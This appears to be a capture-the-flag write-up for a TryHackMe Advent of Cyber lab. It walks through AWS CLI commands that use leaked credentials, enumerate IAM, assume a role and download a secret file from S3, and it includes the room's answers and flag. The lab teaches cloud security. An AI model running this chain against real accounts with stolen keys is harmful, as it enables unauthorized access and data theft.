# 🎄 Advent of Cyber 2025 — Day 23  
<img src="./images/day23-banner.png" width="900"/>

**Title:** AWS Security - S3cret Santa         
**Category:** Cloud Security, AWS, IAM  
**Difficulty:** Medium  
**Room Link:** [AWS Security - S3cret Santa](https://tryhackme.com/room/cloudenum-aoc2025-y4u7i0o3p6)                      
**Status:** ✅ Completed  

---

## 🧭 Scenario Overview

One of TBFC’s stealthiest infiltrated elves managed to sneak into **Sir Carrotbane’s office** and discovered a bundle of **cloud credentials** casually sitting on his desktop.

These credentials might be the key to regaining access to **TBFC’s cloud infrastructure**.

Our mission:
- Use the leaked credentials
- Enumerate AWS permissions
- Escalate access via IAM roles
- Exfiltrate sensitive data from S3

---

## 🎯 Learning Objectives

- Learn the basics of **AWS accounts**
- Enumerate IAM permissions from an attacker’s perspective
- Understand **IAM users, groups, roles, and policies**
- Use the **AWS CLI** effectively
- Assume IAM roles using **STS**

---

## 🔐 AWS CLI Credential Setup

AWS credentials are automatically configured in:

``bash
~/.aws/credentials

Example:
aws_access_key_id = AKIAxxxxxxxxxxxxxxxxxx
aws_secret_access_key = DhMy3ac4xxxxxxxxxx

---
## 🔍 Identifying the Current AWS Identity

Run:
aws sts get-caller-identity

Output:
{
    "UserId": "AIDAU2VYTBGYOHNOCJMX3",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/sir.carrotbane"
}
✅ The credentials belong to sir.carrotbane.

### 📝 Answer

What is the AWS Account number?
123456789012

---
## 🧠 IAM Overview

AWS Identity and Access Management (IAM) controls:

Who can access AWS resources
What actions they can perform
On which resources

Core IAM Components

Users – individual identities
Groups – collections of users
Roles – temporary identities with permissions
Policies – permission definitions (JSON)

### 📝 Answer

What IAM component defines permissions?
policy

---
## 👤 Enumerating IAM Users

List users:
aws iam list-users

---
## 📜 Enumerating User Policies

List inline policies:
aws iam list-user-policies --user-name sir.carrotbane

List attached policies:
aws iam list-attached-user-policies --user-name sir.carrotbane


Check group membership:
aws iam list-groups-for-user --user-name sir.carrotbane

### 📄 Reviewing Inline Policy

Retrieve policy details:
aws iam get-user-policy --policy-name SirCarrotbanePolicy --user-name sir.carrotbane


Key permission discovered:
sts:AssumeRole

### 📝 Answer

What is the name of the policy assigned to sir.carrotbane?
SirCarrotbanePolicy

---
## 🎭 Enumerating IAM Roles

List roles:
aws iam list-roles


Discovered role:
bucketmaster

### 📜 Reviewing Role Policies

List inline role policies:
aws iam list-role-policies --role-name bucketmaster


Retrieve policy:
aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy

Permissions Granted

s3:ListAllMyBuckets
s3:ListBucket
s3:GetObject

### 🔁 Assuming the bucketmaster Role

Request temporary credentials:

aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/bucketmaster \
  --role-session-name TBFC

Export credentials:

export AWS_ACCESS_KEY_ID="ASIAxxxxxxxxxxxx"
export AWS_SECRET_ACCESS_KEY="xxxxxxxxxxxx"
export AWS_SESSION_TOKEN="xxxxxxxxxxxx"


Verify:
aws sts get-caller-identity

### 📝 Answer

Apart from GetObject and ListBucket, what other action is allowed?
ListAllMyBuckets

---
## ☁️ What Is Amazon S3?

Amazon S3 (Simple Storage Service) is an object storage service used to store:

Documents
Images
Logs
Backups
Configuration files
Objects are stored inside buckets.

📦 Enumerating S3 Buckets

List buckets:
aws s3api list-buckets

Interesting bucket found:
easter-secrets-123145

### 📂 Listing Bucket Contents
aws s3api list-objects --bucket easter-secrets-123145

---
## 📥 Exfiltrating the File

aws s3api get-object \
  --bucket easter-secrets-123145 \
  --key cloud_password.txt \
  cloud_password.txt

### 📝 Final Answer

Contents of cloud_password.txt
thm{more_like_sir_cloudbane}

---
## 🧠 Key Takeaways

IAM misconfigurations are dangerous
sts:AssumeRole can enable privilege escalation
S3 buckets often store sensitive secrets
Enumeration is critical before exploitation

---
## ✅ Day 23 Completed

TBFC’s cloud access regained.
Sir Carrotbane’s secrets exposed.
Onward to the next SOC-mas challenge 🎄🔥

---
## 🔜 Next Step

Proceed to Day 24 of Advent of Cyber 2025.
